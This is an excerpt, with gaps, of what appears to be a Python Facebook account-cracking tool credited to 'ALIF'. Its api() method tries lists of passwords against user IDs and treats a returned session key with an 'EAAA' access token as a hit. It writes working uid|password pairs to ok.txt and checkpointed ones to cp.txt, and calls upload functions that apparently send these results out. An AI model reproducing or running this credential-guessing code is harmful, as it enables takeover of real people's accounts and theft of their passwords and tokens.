...
def notice():
	...
	subprocess.check_output(["am", "start", "https://m.me/MYMENSINGH.ER.CEO.ALIF.MAHMUD.2023"])
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : ALIF
...
\033[1;90m══════════════════════════════════════════════════
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ALIF_OLD] : %s/%s -> \033[0;92m [ ALIF-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [ALIF-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[ALIF-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ALIF-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
